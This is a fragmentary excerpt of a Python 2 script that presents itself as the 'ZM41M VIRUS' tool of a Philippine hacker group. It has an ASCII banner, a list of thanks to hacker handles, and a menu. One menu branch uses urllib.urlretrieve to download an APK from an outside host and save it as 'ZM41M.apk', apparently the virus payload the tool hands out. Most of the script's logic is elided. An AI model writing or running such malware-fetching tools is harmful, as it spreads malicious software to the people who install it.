...
# -*- coding: utf-8 -*-
"""
ZM41M VIRUS (S.P) v1.0
Author: ZM41M N4V4RRO
Date: 07/09/18
Silent Professional (S.P) Elite Unite Of PHS (E.S)"
"""
...
def __banner__():
	print "%s      _                              %s" % (Y,N)
	print "%s _ _ | |_  _ _  ___  _____  ___  ___  %s{%s-ZM41M-#dev%s}%s" % (Y,W,Y,W,N)
	print "%s| | || . || | || . ||     || .'|| . |%s" % (Y,N)
...
credits=('''%s
Credits
	Thanks to Silent Professional (S.P) "Elite Unite Of PHS (E.S)"
	Thanks to Philippine Hacker Society (Endless Supply)
	Thanks to {GM}DAVE{V.I.P} | ZM41M | mr.1mdummy | J3DC4P1L1 | PH. 4C3 | [Mr.Hunter] | APROXX14PH | MR.Light | Ph.ShadowX | BORICK | Mr.Rookie | 2$V~*LAZY* | D3c/pher | H4rm0ny | 13-D4RK-13 | GR3YSH4D0W 
	Thanks for those who all have been waiting for the release of this tool for a long time
	Thanks to All of hackers in the Philippines.
...
while opt:
	...
	if vbugmap.strip() in 'help'.split():
		...
		if apkfile.strip() in "01 1".split():
			...
			urllib.urlretrieve("http://override.waper.co/files/b55db82cd4b45d3d6c0b9c86896431.apk", 'ZM41M.apk')
		else:
